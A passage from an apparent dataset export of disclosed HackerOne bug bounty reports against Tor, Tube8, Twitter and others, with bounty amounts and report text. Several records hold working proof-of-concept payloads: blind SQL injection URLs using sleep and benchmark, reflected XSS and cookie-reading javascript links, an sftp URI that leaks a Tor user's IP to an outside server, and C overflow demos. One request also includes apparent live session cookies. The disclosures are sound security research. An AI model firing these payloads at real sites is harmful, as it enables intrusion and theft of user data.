As a proof-of-concept, you can open http://192.31.23.250/_events/get-event-values.html and https://poc.tom.vg/events-session-associate/get-event-values.html in different tabs (these are from different origins), select onlanguagechange from the dropdown and press the ""Start"" button. Next, change the language of the browser in the ""Content"" tab of the preferences (about:preferences#content): just add/remove one of change the order. Afterwards you should see an event logged on both tabs with approximately the same timestamp (the value might slightly differ because of the timer resolution).geko Tor staff  posted a comment. Aug 11th (5 years ago)Thanks for this report and the PoC. While I think the risk of cross-origin tracking with that method is quite minimal, you are right we should fix it. I've opened https://trac.torproject.org/projects/tor/ticket/23216.geko Tor staff  closed the report and changed the status to Resolved. Aug 11th (5 years ago)The Internet Bug Bounty  rewarded tomvg with a $100 bounty. Aug 11th (5 years ago)geko Tor staff  requested to disclose this report. Oct 19th (5 years ago)tomvg   agreed to disclose this report. Oct 19th (5 years ago)  This report has been disclosed. Oct 19th (5 years ago)",https://hackerone.com/reports/257942,England,United Kingdom,Cambridge,2017,8,8,17,18
Tor,51-100,1.0,1m-10m,$100.00,No value,0.0,Memory Corruption - Generic,libevent (stack) buffer overflow in evutil_parse_sockaddr_port,"guido  submitted a report to Tor.Jan 25th (7 years ago)in evutil.c:
Code 415 BytesWrap lines Copy Download11798     char buf[128];
2...
3...
41809     cp = strchr(ip_as_string, ':');
51810     if (*ip_as_string == '[') {
61811         int len;
71812         if (!(cp = strchr(ip_as_string, ']'))) {
81813             return -1;
91814         }
101815         len = (int) ( cp-(ip_as_string + 1) );
111816         if (len > (int)sizeof(buf)-1) {
121817             return -1;
131818         }
141819         memcpy(buf, ip_as_string+1, len);
Length between '[' and ']' is cast to signed 32 bit integer on line 1815. Is the length is more than 2<<31 (INT_MAX), len will hold a negative value. Consequently, it will pass the check at line 1816. Segfault happens at line 1819.
Generate a resolv.conf with generate-resolv.conf, then compile and run poc.c. See entry-functions.txt for functions in tor that might be vulnerable.
Guido4 attachments:F70844: entry-functions.txtF70845: libev-to_evutil_parse_sockaddr_port.txtF70846: poc.cF70847: generate-resolv.conf.py",https://hackerone.com/reports/112784,England,United Kingdom,Cambridge,2016,1,25,22,43
Tor,51-100,1.0,1m-10m,"$3,000.00",Critical,9.5,Information Disclosure,Linux TBB SFTP URI allows local IP disclosure,"rethink5807  submitted a report to Tor.Jul 26th (5 years ago)Browsing to a simple URL to an sftp URI allows bypasses socks proxy for DNS and browsing.
Tested on a clean install of Ubuntu 16.04 with TBB 7.0.2 (4097d43aa0be86ae3fe43ec8f3ac5394) download from https://www.torproject.org/dist/torbrowser/7.0.2/tor-browser-linux64-7.0.2_en-US.tar.xz
POC:
Navigate to sftp://104.131.180.179:80/index.php
After ~1 minute check http://104.131.180.179/ip,txt for your IP address
It appears that ubuntu's default SSH client is associated with this URI which causes the client to attempt the connection on behalf of the user. The windows TBB does not appear to be affected. 
Excerpt from apache logs:
apache2: [core:error][pid 10671] [client x.x.x.x:40063] AH00126: Invalid URI in request SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1
Not surprisingly, the client can also be directed to local resources as well.",https://hackerone.com/reports/253429,England,United Kingdom,Cambridge,2017,7,26,2,31
Tor,51-100,1.0,1m-10m,$100.00,No value,0.0,Memory Corruption - Generic,potential memory corruption in or/buffers.c (particularly on 32 bit),"guido  submitted a report to Tor.Aug 26th (6 years ago)In or/buffer.s.c:
Code 252 BytesWrap lines Copy Download1/** Return the allocation size we'd like to use to hold <b>target</b>
2 * bytes. */
3static inline size_t
4preferred_chunk_size(size_t target)
5{
6  size_t sz = MIN_CHUNK_ALLOC;
7  while (CHUNK_SIZE_WITH_ALLOC(sz) < target) {
8    sz <<= 1;
9  }
10  return sz;
11}
Code 95 BytesWrap lines Copy Download1#define MIN_CHUNK_ALLOC 256
2#define CHUNK_SIZE_WITH_ALLOC(memlen) ((memlen) - CHUNK_HEADER_LEN)
CHUNK_HEADER_LEN is usually around 30 bytes or so.
The problem with preferred_chunk_size is that for a large size_t target, the function will return 0.
If you compile this program with -m32:
Code 3.32 KiBWrap lines Copy Download1#include <stdio.h>
2#include <stdint.h>
3#define FLEXIBLE_ARRAY_MEMBER /**/
4#define DEBUG_CHUNK_ALLOC
5/** A single chunk on a buffer. */
6typedef struct chunk_t {
7  struct chunk_t *next; /**< The next chunk on the buffer. */
8  size_t datalen; /**< The number of bytes stored in this chunk */
9  size_t memlen; /**< The number of usable bytes of storage in <b>mem</b>. */
10#ifdef DEBUG_CHUNK_ALLOC
11  size_t DBG_alloc;
12#endif
13  char *data; /**< A pointer to the first byte of data stored in <b>mem</b>. */
14  uint32_t inserted_time; /**< Timestamp in truncated ms since epoch
15                           * when this chunk was inserted. */
16  char mem[FLEXIBLE_ARRAY_MEMBER]; /**< The actual memory used for storage in
17                * this chunk. */
18} chunk_t;
19#if defined(__GNUC__) && __GNUC__ > 3
20#define STRUCT_OFFSET(tp, member) __builtin_offsetof(tp, member)
21#else
22 #define STRUCT_OFFSET(tp, member) \
23   ((off_t) (((char*)&((tp*)0)->member)-(char*)0))
24#endif
25#define MIN_CHUNK_ALLOC 256
26#define CHUNK_HEADER_LEN STRUCT_OFFSET(chunk_t, mem[0])
27#define CHUNK_SIZE_WITH_ALLOC(memlen) ((memlen) - CHUNK_HEADER_LEN)
28static inline size_t
29preferred_chunk_size(size_t target)
30{
31  size_t sz = MIN_CHUNK_ALLOC;
32  while (CHUNK_SIZE_WITH_ALLOC(sz) < target) {
33    sz <<= 1;
34  }
35  return sz;
36}
37
38int main(void)
39{
40    size_t i = 1024;
41    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
42    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
43    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
44    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
45    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
46    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
47    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
48    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
49    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
50    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
51    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
52    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
53    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
54    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
55    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
56    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
57    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
58    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
59    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
60    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
61    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
62    printf(""i is %08X, preferred_chunk_size is %08X\n"", i, preferred_chunk_size(i)); i <<= 1;
63    return 0;
64}
the output is:
Code 1.03 KiBWrap lines Copy Download1i is 00000400, preferred_chunk_size is 00000800
2i is 00000800, preferred_chunk_size is 00001000
3i is 00001000, preferred_chunk_size is 00002000
4i is 00002000, preferred_chunk_size is 00004000
5i is 00004000, preferred_chunk_size is 00008000
6i is 00008000, preferred_chunk_size is 00010000
7i is 00010000, preferred_chunk_size is 00020000
8i is 00020000, preferred_chunk_size is 00040000
9i is 00040000, preferred_chunk_size is 00080000
10i is 00080000, preferred_chunk_size is 00100000
11i is 00100000, preferred_chunk_size is 00200000
12i is 00200000, preferred_chunk_size is 00400000
13i is 00400000, preferred_chunk_size is 00800000
14i is 00800000, preferred_chunk_size is 01000000
15i is 01000000, preferred_chunk_size is 02000000
16i is 02000000, preferred_chunk_size is 04000000
17i is 04000000, preferred_chunk_size is 08000000
18i is 08000000, preferred_chunk_size is 10000000
19i is 10000000, preferred_chunk_size is 20000000
20i is 20000000, preferred_chunk_size is 40000000
21i is 40000000, preferred_chunk_size is 80000000
22i is 80000000, preferred_chunk_size is 00000000
The danger is that the return value of preferred_chunk_size is always used as a parameter to tor_malloc or tor_realloc. It is called at these places:
In buf_pullup:
Code 124 BytesWrap lines Copy Download1 210     newsize = CHUNK_SIZE_WITH_ALLOC(preferred_chunk_size(capacity));
2 211     newhead = chunk_grow(buf->head, newsize);
In buf_new_with_capacity:
Code 258 BytesWrap lines Copy Download1 283 /** Create and return a new buf with default chunk capacity <b>size</b>.
2 284  */
3 285 buf_t *
4 286 buf_new_with_capacity(size_t size)
5 287 {
6 288   buf_t *b = buf_new();
7 289   b->default_chunk_size = preferred_chunk_size(size);
8 290   return b;
9 291 }
In buf_add_chunk_with_capacity:
Code 701 BytesWrap lines Copy Download1 401 /** Append a new chunk with enough capacity to hold <b>capacity</b> bytes to
2 402  * the tail of <b>buf</b>.  If <b>capped</b>, don't allocate a chunk bigger
3 403  * than MAX_CHUNK_ALLOC. */
4 404 static chunk_t *
5 405 buf_add_chunk_with_capacity(buf_t *buf, size_t capacity, int capped)
6 406 {
7 407   chunk_t *chunk;
8 408 
9 409   if (CHUNK_ALLOC_SIZE(capacity) < buf->default_chunk_size) {
10 410     chunk = chunk_new_with_alloc_size(buf->default_chunk_size);
11 411   } else if (capped && CHUNK_ALLOC_SIZE(capacity) > MAX_CHUNK_ALLOC) {
12 412     chunk = chunk_new_with_alloc_size(MAX_CHUNK_ALLOC);
13 413   } else {
14 414     chunk = chunk_new_with_alloc_size(preferred_chunk_size(capacity));
15 415   }
buf_new_with_capacity is currently called nowhere except for tests.
buf_add_chunk_with_capacity is called at various places but currently not with the capped parameter set to 0.
However, buf_pullup is called at various places and the call to preferred_chunk_size is reachable. Whether it is reachable with a parameter large enough that it will return 0 I'm not sure about.
Code 385 BytesWrap lines Copy Download1int
2tor_main(int argc, char *argv[])
3{
4    buf_t* buf;
5    char* string;
6    size_t string_len;
7    size_t i;
8
9    buf = buf_new();
10    string_len = 0x00001000;
11    string = tor_malloc(string_len);
12    for (i = 0; i < 507904; i++)
13    {
14        write_to_buf(string, string_len, buf);
15    }
16    write_to_buf(string, 0x3FFFFFA, buf);
17    free(string);
18    buf_pullup(buf, 0x90000000); 
19}
What will happen is that buf_pullup will call chunk_grow
Code 349 BytesWrap lines Copy Download1 140 static inline chunk_t *
2 141 chunk_grow(chunk_t *chunk, size_t sz)
3 142 {
4 143   off_t offset;
5 144   size_t memlen_orig = chunk->memlen;
6 145   tor_assert(sz > chunk->memlen);
7 146   offset = chunk->data - chunk->mem;
8 147   chunk = tor_realloc(chunk, CHUNK_ALLOC_SIZE(sz));
9 148   chunk->memlen = sz;
10 149   chunk->data = chunk->mem + offset;
tor_realloc will in effect be called with a size parameter of 0. Whether and how much legitimate heap memory realloc will allocate might be implementation-dependent. The point is that the following lines might overwrite heap memory:
Code 68 BytesWrap lines Copy Download1 148   chunk->memlen = sz;
2 149   chunk->data = chunk->mem + offset;
since chunk is a memory area that has just been allocated to 0 (or 1, after correction) bytes.
The whole scenario is not very likely considering Tor's frugal memory consumption but it is nonetheless a programming fault in the buffers ""API"" that could lead to stability issues. Especially if you ever expand the use of buf_pullup, buf_new_with_capacity, and/or uncapped buf_add_chunk_with_capacity, it'll be wise to hard-limit the amounts of right-shifts in preferred_chunk_size (a single unintended negative integer -> size_t can be conducive in establishing an exploitation path).",https://hackerone.com/reports/163459,England,United Kingdom,Cambridge,2016,8,26,1,6
Traffic Factory,11-50,0.0,1m-10m,$200.00,Low,2.0,Business Logic Errors,WordPress Plugin Update Confusion at trafficfactory.com,"vavkamil  submitted a report to Traffic Factory.Oct 10th (about 1 year ago)Hi,
I'm currently researching a ""novel"" supply chain attack affecting WordPress plugins, and I believe your website might be vulnerable.
The way it works is similar to a recent Dependency Confusion attack, where a malicious actor can take over internal packages unclaimed on PyPI / npm registry.
If you use an internally developed WordPress plugin not present in WordPress Plugin Directory, an attacker might upload it there. That would introduce the ""Confused deputy problem"" attack scenario, where the privileged user, instructed to update all plugins regularly, inadvertently infects the instance with malware.
I wrote a custom scanner, which passively detects plugins on a front page (JS/CSS assets), and searches the slug name in the WP SVN registry. It found ""tf-elementor"" plugin installed at ""trafficfactory.com"":
https://www.trafficfactory.com/wp-content/plugins/tf-elementor/assets/css/tf9d3a.css?ver=5.6.5
currently not present in:
https://plugins.svn.wordpress.org/tf-elementor
Steps To Reproduce:
The WordPress approval process for new plugins is automated and open-source, so it's possible to see which checks needs to pass:

Slug must only contain lowercase alphanumeric characters and dash.
Slug can't have a reserved name like wp-admin (has_reserved_slug())
Slug can't be on a list of protected trademarks (has_trademarked_slug())
Slug can't be installed on more than 100 websites (wporg_stats_get_plugin_name_install_count)

The whole flow looks like this:

An attacker submits a plugin with the same name you use for a review
It will pass the review process, and the attacker gets access to the SVN repository
The attacker uploads the plugin files, and it's added to the WordPress Plugin Directory for anyone to use
The attacker adds a backdoor and bumps the plugin version
You will get a notification that a new update is available; when you update, your website gets compromised

I did not attempt to claim your plugin, as the update would inadvertently break the website (old plugin files will get deleted), but I simulated the attack with my custom plugin, and it works.
How to mitigate
There is no easy way to defend yourself because it's by design, and WordPress doesn't allow you to upload a ""dummy"" version of your plugin. You can either add the plugin you use in the WordPress Plugin Directory or change the plugin name to prevent the review process from succeeding.
The plugin slug can only contain lower case alphanumeric characters and dash as a delimiter. Some of the keywords are prohibited as well, which could help us in this case. That means that you can rename your custom plugins in the following ways:

internal_plugin_name
InternalPluginName
wp-internal-plugin-name

It is also possible to leverage a hook and write a custom update function, blocking the internal WP API call and replacing it with your own, similar to how a paid plugin offers custom updates from their servers.
Some plugins do that for you, for example, Easy Updates Manager, which allows you to block updates for specific plugins.
Supporting Material/References:
I wrote a custom scanner in Python, a WordPress Docker container to simulate the Plugin update process, a custom plugin to pass the review for the SVN registry, and an extensive write-up describing everything in more detail.
I plan to publish everything soon, but let me know, and I will share a draft with you beforehand. Feel free to requests any additional info from me, as I understand it sounds more like a theoretical vulnerability without a valid PoC.
Thank you!
Kind regards,
@vavkamil
Impact
An attacker can hijack your plugin, currently not available in the WordPress Plugin Directory (SVN registry). If that happens and you update the plugin, it can introduce a backdoor or RCE, essentially giving keys to the kingdom to the attacker.",https://hackerone.com/reports/1364851,Prague,Czechia,Prague,2021,10,10,10,59
Tube8,101-250,0.0,1m-10m,"$2,500.00",High,8.6,SQL Injection,Blind SQL injection in Hall of Fap,"ramsexy  submitted a report to Tube8.Dec 7th (5 years ago)Summary:
There is a blind SQL injection vulnerability in GET parameter topsort in page https://www.tube8.fr/ajax-hof/.
Description:
SQL functions can be injected into the SQL query. Using the sleep function, which makes the database sleep, we can notice the injection.
PoC
The following request will make the database sleep for around 20 seconds :
https://www.tube8.fr/ajax-hof/?toplimit=2&topsort=followers+or+sleep(0.000000001)
Larger value in the sleep function will make the request timeout. I think it may be because the injection point is in a WHERE statement, so the sleep function is executed on every record in the table.
Supporting Material/References:
Image F244911: blind_sql_injection.png 51.34 KiBZoom in Zoom out Copy Download
Impact
An attacker, using a blind SQL injection, can retrieve the data in the database.1 attachment:F244911: blind_sql_injection.png",https://hackerone.com/reports/295841,California,United States,San Jose,2017,12,7,2,0
Tube8,101-250,0.0,1m-10m,"$2,500.00",High,7.95,SQL Injection,"Blind SQL injection and making any profile comments from any users to disappear using ""like"" function (2 in 1 issues)","sp1d3rs  submitted a report to Tube8.Jun 9th (4 years ago)Summary by sp1d3rsSummary
The injection was found manually, used discovery methods are basically the same as described in this awesome article by @gerben_javado: https://gerbenjavado.com/manual-sql-injection-discovery-tips/
There was some kind of caching in place that hardened sqli identification (after each caching event we had to reproduce issue with different comment - it also made the injection undetectable by the scanners, because after several test requests response will be cached and couldn't be used to determine presence of sqli, so attacker needs to exploit this manually or write custom script or tamper for sqlmap).
##POC
Code 285 Bytes1https://www.tube8.com/ajax2/likeProfileComment/?profile_id=70418291&comment_id=291751-sleep(5)&hash=f42ffae0449536cfd0419826f3adf136
2or
3https://www.tube8.com/ajax2/likeProfileComment/?profile_id=70418291&comment_id=291751-benchmark(1000000000,1-1)&hash=f42ffae0449536cfd0419826f3adf136
It worked on each second request (so it is actually bSQLi using dislike, the first request was making like and wasn't vulnerable). Also, after each successful SQLi test, the request appeared to be cached and vulnerability could be reproduced again only with different comment_id for some time. As a side effect, the comment could disappear for a few minutes.
Why -sleep(5), -benchmark(1000000000,1-1) payloads were used? I suspected that comment_id was processed as integer and was unescaped in the query so int-sleep(t) is a valid construction whatever the full query is, which doesn't require various quote/parenthesis tests for the quick manual confirmation. I found it also useful when WAF/filters block the quotes.
The severity was set to High because I propose Critical only for content injections:)
Thanks to the team for the awesome communication and the bounty!",https://hackerone.com/reports/363815,California,United States,San Jose,2018,6,9,21,20
Tube8,101-250,0.0,1m-10m,"$5,000.00",Critical,9.5,Improper Access Control - Generic,CRITICAL ISSUE : Leak of all accounts mail login md5 pass and more,"freesec  submitted a report to Tube8.Mar 24th (4 years ago)Summary by freesecI reported here a critical issue on a specific endpoint allowing to collect easily all tube8 accounts sensitive information, including email and password.
The report could be easily scripted and used under the rate limiting radar without any problem.
All accounts could be compromised, including the Tube8 account itself, if the MD5 password could be decyphered.
The issue were a simple excessive data exposure and no specific action were required, others that lokking the response on this endpoint.",https://hackerone.com/reports/514488,California,United States,San Jose,2019,3,24,12,6
Twitter,5001-10000,0.0,over-1b,$280.00,High,7.95,Phishing, Github Account hijack through broken link in developer.twitter.com,"voatz  submitted a report to Twitter.Nov 11th (2 years ago)Description
A link in    https://developer.twitter.com/en/docs/twitter-api/tools-and-libraries   was broken and anyone could create that account which leads to account impersonate
Steps To Reproduce
1) Visit https://developer.twitter.com/en/docs/twitter-api/tools-and-libraries
2) Scroll down to Javascript/Node.js and click on by @HunterLarco (v2)
3)  Create github username HunterLarcol
4) When someone visits and scroll down to  javascript/Node.js and click on @HunterLarco (v2). They are redirected to my account
similar report
https://hackerone.com/reports/265696
To solve this issue
put this link https://github.com/HunterLarco
Please let me know if you have any questions. I am happy to help
Impact
Impact
The users are coming from developer.twitter.com So, the attacker can put malicious content on the github  and many users will be the victim for example https://github.com/HunterLarcol/twitter-v2. Moreover it leads to the loss in the reputation of the company4 attachments:F1073585: developer_twitter.jpgF1073586: account.jpgF1073587: profile1.jpgF1073588: profile.jpg",https://hackerone.com/reports/1031321,California,United States,San Francisco,2020,11,11,6,59
Twitter,5001-10000,0.0,over-1b,"$2,520.00",Medium,5.45,Cross-site Scripting (XSS) - Generic, Cross-site scripting (reflected),"linkks  submitted a report to Twitter.Oct 19th (6 years ago)hi Twitter team
https://twitter.com/i/cards/tfw/v1/788663483873263617?cardname=player&autoplay_disabled=true&forward=true&earned=true&lang=en&card_height=130&scribe_context=l4tqu%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3eo7gyv
The value of the scribe_context request parameter is copied into a JavaScript string which is encapsulated in double quotation marks. The payload l4tqu</script><script>alert(1)</script>o7gyv was submitted in the scribe_context parameter. This input was echoed unmodified in the application's response.
GET /i/cards/tfw/v1/788663483873263617?cardname=player&autoplay_disabled=true&forward=true&earned=true&lang=en&card_height=130&scribe_context=l4tqu%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3eo7gyv HTTP/1.1
Host: twitter.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://twitter.com/
Cookie: guest_id=v1%3A146255384359384655; _ga=GA1.2.178796086.1467670836; kdt=qU1PQNfIb0sNg6vhmvMkEIe1zla3g5clz7cCgLds; remember_checked_on=1; twid=""u=4092731777""; auth_token=b4a4eb0642ec5579bf2f58a98d1eca87ad9552a7; moments_profile_moments_nav_tooltip_self=true; eu_cn=1; mp_c3de24deb6a3f73fba73a616bb625130_mixpanel=%7B%22distinct_id%22%3A%20%22ce74a9d62a1e8a572a472095b248ab3f4167e8341d603b9d689bf497fca88101%22%2C%22isAdmin%22%3A%20false%2C%22isAccountSpending%22%3A%20false%2C%22serviceLevel%22%3A%20%22null%22%2C%22goalBased%22%3A%20true%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fads.twitter.com%2Fnew_campaign%2F18ce54aqb54%2Fstart%22%2C%22%24initial_referring_domain%22%3A%20%22ads.twitter.com%22%7D; mbox=check#true#1476741932|session#dd4f8eba87774a26834c0ce387200a8a#1476743732|PC#dd4f8eba87774a26834c0ce387200a8a.26_5#1477951472; SSESS3c8b2bbd5af1180dab341c61a9900084=krekirm43u81j7g7bqbt9uij76; lang=it; moments_user_moment_profile_create_moment_tooltip=true; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCH3hdNxXAToMY3NyZl9p%250AZCIlZWRlZWQyYzFhYjMwYWYwOTJjMDEwZGM0NzM0NDIxMTk6B2lkIiU3MGQ4%250AMWY5MDI3Y2RjZWQyYmY3OGI2NTEwZTQxOGVkZQ%253D%253D--c5e4969a1a90f82f0db9ffa1991f7a2da912bfba; lang=en
Connection: close1 attachment:F128784: H8ROxPewSU2iUs099pCJuw_1_.jpg",https://hackerone.com/reports/176754,California,United States,San Francisco,2016,10,19,10,29
Twitter,5001-10000,0.0,over-1b,$560.00,Medium,5.45,Business Logic Errors,[Bypass fixed #664038 and #519059] Application settings change settings that have been set by the user,"singo_edan  submitted a report to Twitter.Oct 11th (3 years ago)I have reported this bug in report #681361 so that you make a FULL fix, but you refused (considered duplicate) and I have to wait for report #664038 to be resolved, now I come again to report the bug.
The settings for ""protected tweets"" that have been set from another application accidentally change after the user changes the settings on the twitter application.
Step To Reproduction

Set ""protected tweets"" from the Twitter Web or Twitter Lite application
Confirm and make sure that ""tweet is protected"" from the web or lite
then open the twitter application and change the hashtag (#) setting from OFF to ON

This method will trigger problems in the settings between the web and Twitter applications so that what has been set from outside the Twitter application can change.
the bug in this report has the same impact as report #664038 and #519059 but this bugs can still be triggered even though one of these bugs in reports has been fixed.
I say that because the bug in report #664038 and #519059 has been fixed and I can trigger the bug again in new versi app twitter 8.16.0 release 00
my conclusion this bug is Bypassing significant controls because after this bug is fixed it can be triggered again
Impact
accidentally the ""protected tweet"" setting OFF and user tweets seen publicly",https://hackerone.com/reports/712344,California,United States,San Francisco,2019,10,11,17,44
Twitter,5001-10000,0.0,over-1b,"$5,040.00",High,7.95,Cross-Site Request Forgery (CSRF),[CRITICAL] Full account takeover using CSRF,yipman  submitted a report to Twitter.Jun 2nd (5 years ago),https://hackerone.com/reports/235642,California,United States,San Francisco,2017,6,2,2,42
Twitter,5001-10000,0.0,over-1b,"$1,120.00",Medium,5.45,None,[dev.twitter.com] XSS and Open Redirect,"bobrov  submitted a report to Twitter.Aug 16th (5 years ago)Description
XSS via Request-URI which requires user interaction. The vulnerability is caused by the difference in the Request-URI processing in the Location header and in the link on the page.
By creating an incorrect port in the link on the Location header, you can block the redirection for the FireFox browser. Next, using the difference in the processing, generate a ""javascript"" link on the page.
PoC: Open Redirect
Browsers: Chrome, FireFox, Opera
Code 46 BytesWrap lines Copy Download1https://dev.twitter.com/https:/%5cblackfan.ru/
HTTP Response:
Code 70 BytesWrap lines Copy Download1HTTP/1.1 302 Found
2connection: close
3...
4location: https:/\blackfan.ru
PoC: XSS
Browsers: FireFox
Steps to reproduce: Open and click the link
Code 70 BytesWrap lines Copy Download1https://dev.twitter.com//x:1/:///%01javascript:alert(document.cookie)/
HTTP Response:
Code 282 BytesWrap lines Copy Download1HTTP/1.1 302 Found
2connection: close
3...
4location: //x:1/://dev.twitter.com/javascript:alert(document.cookie)
5...
6
7
8<p>You should be redirected automatically to target URL: <a href=""javascript:alert(document.cookie)"">javascript:alert(document.cookie)</a>.  If not click the link.
Image F213436: Screenshot_at_20-24-11.png 39.20 KiBZoom in Zoom out Copy Download1 attachment:F213436: Screenshot_at_20-24-11.pngSummary by bobrovhttp://blog.blackfan.ru/2017/09/devtwittercom-xss.html",https://hackerone.com/reports/260744,California,United States,San Francisco,2017,8,16,16,30
Twitter,5001-10000,0.0,over-1b,$560.00,Medium,5.45,Cross-site Scripting (XSS) - Reflected,"[Gnip Blogs] Reflected XSS via ""plupload.flash.swf"" component vulnerable to SOME ","ysx  submitted a report to Twitter.Apr 4th (6 years ago)Hi,
The following endpoints are exposed to reflected cross-site scripting by way of a vulnerable ""plupload.flash.swf"" component on WordPress.
A comprehensive explanation of this vulnerability can be found on resolved report #134738:

WordPress is vulnerable against a Same-Origin Method Execution (SOME) vulnerability that stems from an insecure URL sanitization problem performed in the file plupload.flash.swf. The code in the file attempts to remove flashVars [...] but fails to do so, enabling XSS via ExternalInterface.

Proof of Concept
To reproduce this vulnerability, please access the below Proof of Concept link in the latest version of Firefox with Adobe Flash enabled. I have confirmed exploitability on Windows 7 x64.
Code 406 BytesWrap lines Copy Download1https://blog-origin.gnip.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert&uid%g=XSS&
2
3https://blog.gnip.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert&uid%g=XSS&
4
5https://engineering.gnip.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert&uid%g=XSS&
6
7https://engineering-origin.gnip.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert&uid%g=XSS&
Please let me know if you require any additional information regarding this vulnerability.
Thanks!andrewsorensen   changed the status to Triaged. Apr 4th (6 years ago)Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.
Thank you for helping keep Twitter secure!andrewsorensen   closed the report and changed the status to Resolved. Apr 6th (6 years ago)We consider this issue to be fixed now. Can you please confirm?
Thank you for helping keep Twitter secure!ysx   posted a comment. Apr 6th (6 years ago)Thank you @andrewsorensen, confirming the fix! Would it be possible to enquire about whether this is in-scope for the bounty program please?ysx   posted a comment. Apr 28th (6 years ago)Hi again @andrewsorensen, just wondering if you have any updates on your decision please? Apologies for the second request and thanks again for fixing the issue quickly!Twitter  rewarded ysx with a $560 bounty. Apr 28th (6 years ago)Thanks again for helping us keep Twitter safe and secure for our users!ysx   requested to disclose this report. Apr 29th (6 years ago)Thank you very much for the bounty! Please could we disclose this report?andrewsorensen   agreed to disclose this report. May 8th (6 years ago)  This report has been disclosed. May 8th (6 years ago)Summary by ysxMultiple Gnip blogs were exposed to reflected cross-site scripting by way of an outdated plupload.flash.swf WordPress component. This SWF was vulnerable to Same-Origin Method Execution. Thanks to Twitter for the swift fix, and please excuse the minor typos in the initial report!",https://hackerone.com/reports/218451,California,United States,San Francisco,2017,4,4,5,39
Twitter,5001-10000,0.0,over-1b,"$1,120.00",Low,2.0,Privilege Escalation,[IDOR][translate.twitter.com] Opportunity to change any comment at the forum,"kedrisch-4-t  submitted a report to Twitter.Nov 12th (6 years ago)POC: https://translate.twitter.com/forum/getting-started/topics/7037/posts/43287/edit
Steps to reproduce:
1) Go to any forums topic for example: https://translate.twitter.com/forum/getting-started/topics/7037
2) View source code of the page and take post id (screenshot ""idor edit.jpg"")
3) Append ""/posts/post_id/edit"" to url at the first step (screenshot ""idor edit 2.jpg"")
4) Make some change at the comment and save it2 attachments:F134292: idor_edit_2.jpgF134293: idor_edit.jpg",https://hackerone.com/reports/181748,California,United States,San Francisco,2016,11,12,13,24
Twitter,5001-10000,0.0,over-1b,"$1,260.00",No value,0.0,Information Disclosure,[sms-be-vip.twitter.com] vulnerable to Jetleak,"molejarka  submitted a report to Twitter.Jun 9th (6 years ago)Version of Jetty installed on sms-be-vip.twitter.com (9.2.6.v20141205) is vulnerable to Jetleak.
Jetleak allows to read arbitrary data from previous requests submitted to the server by other users.
More information about Jetleak here:
https://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html 
Tool to check Jeleak:
https://github.com/GDSSecurity/Jetleak-Testing-Script
Below sample HTTP request and response:
GET / HTTP/1.1
Host: sms-be-vip.twitter.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: close
HTTP/1.1 200 OK
Date: Thu, 09 Jun 2016 18:31:04 GMT
Content-Type: text/html; charset=ISO-8859-1
Connection: close
Server: Jetty(9.2.6.v20141205)
Code 613 BytesWrap lines Copy Download1<html>
2 <head>
3  <title>Stratus.025: Welcome</title>
4  <style type=""text/css"">
5   h1, p, table, a, body { font-family: Helvetica,Verdana,Arial; font-size: 11px; }
6   h1 { font-size: 13px; font-weight: bold; }
